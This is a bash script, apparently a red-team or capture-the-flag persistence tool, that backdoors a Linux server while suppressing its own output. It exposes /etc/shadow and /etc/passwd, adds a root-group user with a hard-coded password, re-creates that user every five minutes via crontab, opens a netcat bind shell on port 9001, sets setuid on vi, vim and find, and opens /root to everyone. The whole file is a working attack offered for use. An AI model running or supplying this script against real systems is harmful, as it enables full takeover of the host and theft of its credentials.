#!/bin/bash
chmod 644 /etc/shadow &> /dev/null
chmod 666 /etc/passwd &> /dev/null
useradd coolio &> /dev/null  && echo -e "notpassword\nnotpassword" | passwd coolio &> /dev/null
usermod -a -G root coolio &> /dev/null
echo "*/5 * * * *  root  useradd coolio && echo -e "notpassword\nnotpassword" | passwd coolio && usermod -a -G root coolio" >> /etc/crontab
apt update > /dev/null 2> /dev/null && apt -y install netcat-traditional 2> /dev/null > /dev/null
nc.traditional -l -p 9001 -e /bin/bash &
usermod --shell /bin/bash games &> /dev/null
chmod u+s `which vi` &> /dev/null
chmod u+s `which vim` &> /dev/null
chmod u+s `which find` &> /dev/null
chmod 777 /root &> /dev/null
echo "Oh, well in fact" &> /dev/null
echo "Well, I'll look at it this way" &> /dev/null
echo "I mean technically our server is de_stroyed"
